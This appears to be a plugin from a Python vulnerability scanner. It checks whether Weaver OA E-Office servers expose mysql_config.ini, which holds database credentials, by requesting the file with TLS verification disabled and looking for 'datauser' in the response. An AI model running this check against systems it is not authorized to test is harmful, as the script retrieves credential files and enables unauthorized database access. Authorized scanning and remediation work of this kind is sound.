import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def 泛微OA_mysql_config数据库信息泄漏(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    exp_url = urldata + "mysql_config.ini"
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=exp_url, headers=headers, verify=False)
        if response.status_code == 200 and 'datauser' in response.text:
            print(Vcolors.RED + "[!] 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞\r" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞" + Vcolors.ENDC)
    except Exception as e:
        logging.error("泛微OA_mysql_config数据库信息泄漏脚本出现异常")
  
        


